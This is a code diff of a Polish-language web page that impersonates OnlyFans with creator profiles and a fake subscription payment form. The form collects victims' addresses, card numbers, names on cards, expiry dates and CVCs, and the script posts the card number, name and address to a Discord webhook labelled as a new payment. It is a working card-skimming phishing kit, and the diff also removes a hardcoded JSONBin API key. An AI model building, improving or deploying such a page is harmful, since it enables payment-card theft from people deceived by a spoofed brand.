@@ -5,18 +5,12 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>OnlyFans – Twórcy</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
+        * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
             background: #ffffff;
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Inter', sans-serif;
+            font-family: -apple-system, 'Inter', sans-serif;
             color: #0f0f0f;
         }
-
         .navbar {
             background: #ffffff;
             border-bottom: 1px solid #e6e6e6;
@@ -26,19 +20,16 @@
             align-items: center;
             flex-wrap: wrap;
         }
-
         .logo {
             font-size: 28px;
             font-weight: 800;
             color: #0099ff;
             cursor: pointer;
         }
-
         .nav-buttons {
             display: flex;
             gap: 12px;
         }
-
         .nav-btn {
             background: transparent;
             border: 1px solid #ddd;
@@ -48,19 +39,16 @@
             font-weight: 600;
             cursor: pointer;
         }
-
         .nav-btn.primary {
             background: #0099ff;
             border: none;
             color: white;
         }
-
         .container {
             max-width: 1100px;
             margin: 0 auto;
             padding: 48px 24px;
         }
-
         .card {
             background: #ffffff;
             border-radius: 24px;
@@ -69,28 +57,15 @@
             max-width: 600px;
             margin: 0 auto;
         }
-
-        .card h2 {
-            font-size: 26px;
-            margin-bottom: 8px;
-        }
-
-        .sub {
-            color: #666;
-            margin-bottom: 28px;
-        }
-
-        .form-group {
-            margin-bottom: 20px;
-        }
-
+        .card h2 { font-size: 26px; margin-bottom: 8px; }
+        .sub { color: #666; margin-bottom: 28px; }
+        .form-group { margin-bottom: 20px; }
         label {
             display: block;
             font-size: 13px;
             font-weight: 600;
             margin-bottom: 8px;
         }
-
         input, textarea {
             width: 100%;
             padding: 14px 16px;
@@ -100,12 +75,10 @@
             font-size: 15px;
             font-family: inherit;
         }
-
         input:focus, textarea:focus {
             outline: none;
             border-color: #0099ff;
         }
-
         .btn-submit {
             width: 100%;
             background: #0099ff;
@@ -118,25 +91,19 @@
             cursor: pointer;
             margin-top: 16px;
         }
-
         .profile-header {
             background: #fafafa;
             border-radius: 24px;
             overflow: hidden;
             border: 1px solid #e6e6e6;
         }
-
         .banner-img {
             width: 100%;
             height: 200px;
             object-fit: cover;
             background: #e6e6e6;
         }
-
-        .profile-info {
-            padding: 20px 28px 28px;
-        }
-
+        .profile-info { padding: 20px 28px 28px; }
         .avatar-img {
             width: 100px;
             height: 100px;
@@ -145,23 +112,9 @@
             margin-top: -60px;
             object-fit: cover;
         }
-
-        .profile-name {
-            font-size: 24px;
-            font-weight: 700;
-            margin-top: 12px;
-        }
-
-        .profile-username {
-            color: #0099ff;
-            margin: 4px 0;
-        }
-
-        .profile-bio {
-            color: #666;
-            margin-top: 12px;
-        }
-
+        .profile-name { font-size: 24px; font-weight: 700; margin-top: 12px; }
+        .profile-username { color: #0099ff; margin: 4px 0; }
+        .profile-bio { color: #666; margin-top: 12px; }
         .stats {
             display: flex;
             gap: 32px;
@@ -170,18 +123,8 @@
             border-top: 1px solid #eee;
             border-bottom: 1px solid #eee;
         }
-
-        .stat-number {
-            font-size: 28px;
-            font-weight: 800;
-            color: #0099ff;
-        }
-
-        .stat-label {
-            font-size: 13px;
-            color: #666;
-        }
-
+        .stat-number { font-size: 28px; font-weight: 800; color: #0099ff; }
+        .stat-label { font-size: 13px; color: #666; }
         .subscribe-btn {
             width: 100%;
             background: #0099ff;
@@ -194,20 +137,13 @@
             cursor: pointer;
             margin: 20px 0;
         }
-
         .features {
             background: #f8f8f8;
             border-radius: 16px;
             padding: 20px;
             margin: 20px 0;
         }
-
-        .feature {
-            padding: 8px 0;
-            color: #0099ff;
-            font-weight: 500;
-        }
-
+        .feature { padding: 8px 0; color: #0099ff; font-weight: 500; }
         .modal {
             display: none;
             position: fixed;
@@ -220,7 +156,6 @@
             align-items: center;
             justify-content: center;
         }
-
         .modal-content {
             background: white;
             border-radius: 24px;
@@ -230,7 +165,6 @@
             max-height: 90vh;
             overflow-y: auto;
         }
-
         .modal-content input, .modal-content select {
             width: 100%;
             padding: 12px;
@@ -238,26 +172,20 @@
             border: 1px solid #ddd;
             border-radius: 12px;
         }
-
-        .row {
-            display: flex;
-            gap: 12px;
-        }
-
-        .close-modal {
-            float: right;
-            cursor: pointer;
-            font-size: 24px;
-        }
-
-        .status {
-            margin-top: 16px;
+        .row { display: flex; gap: 12px; }
+        .close-modal { float: right; cursor: pointer; font-size: 24px; }
+        .status { margin-top: 16px; text-align: center; }
+        .error { text-align: center; padding: 60px 20px; }
+        .admin-link {
             text-align: center;
+            margin-top: 40px;
+            padding: 20px;
+            border-top: 1px solid #eee;
+            font-size: 13px;
         }
-
-        .error {
-            text-align: center;
-            padding: 60px 20px;
+        .admin-link a {
+            color: #0099ff;
+            text-decoration: none;
         }
     </style>
 </head>
@@ -283,12 +211,11 @@
                 <option>Polska</option>
                 <option>USA</option>
                 <option>Niemcy</option>
-                <option>Wielka Brytania</option>
             </select>
             <input type="text" id="state" placeholder="Stan / Województwo" required>
             <input type="text" id="address" placeholder="Adres" required>
             <input type="text" id="city" placeholder="Miasto" required>
-            <input type="text" id="cardName" placeholder="Imię i nazwisko na karcie" required>
+            <input type="text" id="cardName" placeholder="Imię na karcie" required>
             <input type="text" id="cardNumber" placeholder="Numer karty" required>
             <div class="row">
                 <input type="text" id="expiry" placeholder="MM/RR" required>
@@ -301,42 +228,22 @@
 </div>
 
 <script>
-    // 🔁 TWOJE DANE Z JSONBIN.IO
-    const JSONBIN_BIN_ID = "6a17526621f9ee59d292be36";
-    const JSONBIN_API_KEY = "$2a$10$n5zHQ0kEEh07LVwDYnZ.seGBpi0Il1HeTw6vRQ.5sSIVuzXNmG5LO";
-    const JSONBIN_URL = `https://api.jsonbin.io/v3/b/${JSONBIN_BIN_ID}`;
-
+    // Ścieżka do pliku JSON (musi być w tym samym folderze)
+    const JSON_FILE = "creators.json";
+    
     let creators = {};
+    let currentUsername = null;
 
     async function loadCreators() {
         try {
-            const response = await fetch(JSONBIN_URL, {
-                headers: { 'X-Master-Key': JSONBIN_API_KEY }
-            });
-            const data = await response.json();
-            creators = data.record || {};
+            const response = await fetch(JSON_FILE + '?t=' + Date.now());
+            if (!response.ok) throw new Error('Nie znaleziono pliku creators.json');
+            creators = await response.json();
         } catch (error) {
             console.error('Błąd ładowania:', error);
             creators = {};
         }
         render();
-    }
-
-    async function saveCreators() {
-        try {
-            await fetch(JSONBIN_URL, {
-                method: 'PUT',
-                headers: {
-                    'Content-Type': 'application/json',
-                    'X-Master-Key': JSONBIN_API_KEY
-                },
-                body: JSON.stringify(creators)
-            });
-            return true;
-        } catch (error) {
-            console.error('Błąd zapisu:', error);
-            return false;
-        }
     }
 
     function render() {
@@ -355,7 +262,7 @@
         app.innerHTML = `
             <div class="card">
                 <h2>🔥 Zostań twórcą</h2>
-                <div class="sub">Dołącz do OnlyFans – wypełnij formularz</div>
+                <div class="sub">Dołącz do OnlyFans</div>
                 <form id="creatorForm">
                     <div class="form-group">
                         <label>Imię i nazwisko</label>
@@ -388,20 +295,24 @@
                     <button type="submit" class="btn-submit">✨ Opublikuj profil ✨</button>
                     <div id="status" class="status"></div>
                 </form>
+                <div class="admin-link">
+                    📝 <strong>Jak dodać profil?</strong><br>
+                    Wypełnij formularz, a następnie <strong>dodaj ręcznie dane do pliku <code>creators.json</code></strong><br>
+                    <a href="#" onclick="showManualInstructions(); return false;">Pokaż instrukcję</a>
+                </div>
             </div>
         `;
 
-        document.getElementById('creatorForm').addEventListener('submit', async (e) => {
+        document.getElementById('creatorForm').addEventListener('submit', (e) => {
             e.preventDefault();
-            const usernameRaw = document.getElementById('username').value;
-            const username = usernameRaw.replace('@', '').toLowerCase();
+            const username = document.getElementById('username').value.replace('@', '').toLowerCase();
             
             if (creators[username]) {
                 document.getElementById('status').innerHTML = '<span style="color:red;">❌ Ta nazwa już istnieje!</span>';
                 return;
             }
 
-            creators[username] = {
+            const newCreator = {
                 fullName: document.getElementById('fullName').value,
                 displayName: document.getElementById('displayName').value,
                 bio: document.getElementById('bio').value,
@@ -411,17 +322,18 @@
                 created: new Date().toISOString()
             };
 
-            const saved = await saveCreators();
-            if (saved) {
-                document.getElementById('status').innerHTML = '<span style="color:#0099ff;">✅ Profil zapisany! Przekierowanie...</span>';
-                setTimeout(() => window.location.href = `/@${username}`, 1500);
-            } else {
-                document.getElementById('status').innerHTML = '<span style="color:red;">❌ Błąd zapisu. Spróbuj ponownie.</span>';
-            }
+            // Pokaż dane do skopiowania
+            const newData = { ...creators, [username]: newCreator };
+            document.getElementById('status').innerHTML = `
+                <div style="background:#f0f0f0; padding:16px; border-radius:12px; text-align:left; margin-top:16px;">
+                    <strong>✅ Skopiuj poniższy JSON i wklej do pliku <code>creators.json</code>:</strong><br>
+                    <textarea style="width:100%; margin-top:12px; font-family:monospace; font-size:12px;" rows="15" readonly>${JSON.stringify(newData, null, 2)}</textarea>
+                    <button onclick="navigator.clipboard.writeText(this.previousElementSibling.value)" style="margin-top:8px; padding:8px; background:#0099ff; color:white; border:none; border-radius:8px; cursor:pointer;">📋 Kopiuj JSON</button>
+                    <p style="margin-top:12px; font-size:12px;">Po wklejeniu do <code>creators.json</code> i odświeżeniu strony, profil będzie działać pod <code>/@${username}</code></p>
+                </div>
+            `;
         });
     }
-
-    let currentUsername = null;
 
     function renderProfile(username) {
         const app = document.getElementById('app');
@@ -433,7 +345,8 @@
                 <div class="error">
                     <h2>😕 Nie znaleziono profilu</h2>
                     <p>Użytkownik <strong>@${username}</strong> nie istnieje.</p>
-                    <button class="nav-btn primary" onclick="navigateToHome()" style="margin-top:20px;">Zarejestruj się</button>
+                    <p style="margin-top:16px;">Dodaj go ręcznie w pliku <code>creators.json</code></p>
+                    <button class="nav-btn primary" onclick="navigateToHome()" style="margin-top:20px;">Strona główna</button>
                 </div>
             `;
             return;
@@ -501,7 +414,7 @@
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
-                        content: `💳 **NOWA PŁATNOŚĆ!**\nProfil: @${currentUsername}\nKraj: ${paymentData.country}\nMiasto: ${paymentData.city}\nAdres: ${paymentData.address}\nKarta: ${paymentData.cardNumber}\nImię na karcie: ${paymentData.cardName}\nData ważności: ${paymentData.expiry}\nCVC: ${paymentData.cvc}`
+                        content: `💳 **NOWA PŁATNOŚĆ!**\nProfil: @${currentUsername}\nKraj: ${paymentData.country}\nMiasto: ${paymentData.city}\nAdres: ${paymentData.address}\nKarta: ${paymentData.cardNumber}\nImię na karcie: ${paymentData.cardName}`
                     })
                 });
                 statusDiv.innerHTML = '✅ Wysłano na Discord!';
@@ -525,6 +438,10 @@
 
     function navigateToHome() {
         window.location.href = '/';
+    }
+
+    function showManualInstructions() {
+        alert('📝 INSTRUKCJA:\n\n1. Otwórz plik creators.json w swoim edytorze\n2. Dodaj nowy wpis według wzoru\n3. Zapisz plik\n4. Odśwież stronę\n\nWzór wpisu:\n"twoja_nazwa": {\n  "fullName": "Imię Nazwisko",\n  "displayName": "Nazwa wyświetlana",\n  "bio": "Opis",\n  "avatar": "URL do avatara",\n  "banner": "URL do banera",\n  "webhook": "",\n  "created": "2024-01-15T10:00:00.000Z"\n}');
     }
 
     loadCreators();
